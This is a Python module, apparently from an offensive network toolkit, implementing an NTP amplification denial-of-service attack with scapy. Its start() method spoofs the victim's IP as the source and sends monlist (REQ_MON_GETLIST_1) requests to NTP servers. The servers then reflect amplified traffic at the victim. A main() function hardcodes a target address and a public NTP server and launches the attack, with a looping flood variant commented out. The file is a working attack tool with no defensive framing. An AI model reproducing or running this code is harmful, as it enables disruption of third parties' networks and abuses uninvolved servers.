from scapy.all import IP, UDP, NTPPrivate, RandShort, send

from netattacker.attacker import AttackerBaseClass


class NtpAmplifier(AttackerBaseClass):
	"""
	Parameters
	----------
	target : str
		The target's hostname or IP address
	ntp_ipv4s : list
		The target NTP servers' IP addresses

	Methods
	-------
	print_target_ntp_addrs()
		Prints the addresses of the target NTP servers
	start()
		Sends spoofed REQ_MON_GETLIST_1 NTP packets to the target NTP servers
	"""

	def __init__(self, target:str, ntp_ipv4s:list):
		"""
		Parameters
        ----------
		target : str
			The target's hostname or IP address
		ntp_ipv4s : list
			The target NTP servers' IP addresses
		"""
		super().__init__(target, attack="NTP_AMPLIFY")
		self.ntp_ipv4s = ntp_ipv4s

	def print_target_ntp_addrs(self):
		"Prints the addresses of the target NTP servers"
		print("[*] Target NTP addresses:")
		for ip in self.ntp_ipv4s:
			print("-->", ip)

	def start(self):
		"Sends spoofed REQ_MON_GETLIST_1 NTP packets to the target NTP servers"
		# Create the NTP request
		ip = IP(src=self.target_ipv4, dst=self.ntp_ipv4s)
		udp = UDP(sport=RandShort(), dport=123)
		ntp = NTPPrivate(mode = 7, implementation = "XNTPD", request_code = "REQ_MON_GETLIST_1")

		# Continuously send the NTP requests to the target NTP servers
		#send(ip/udp/ntp, verbose=False, loop=True)
		send(ip/udp/ntp, verbose=False)

def main():
	a = NtpAmplifier("172.20.10.3", ["88.28.204.54"])
	a.print_target_ip()
	a.print_target_ntp_addrs()
	a.start()

if __name__ == "__main__":
	main()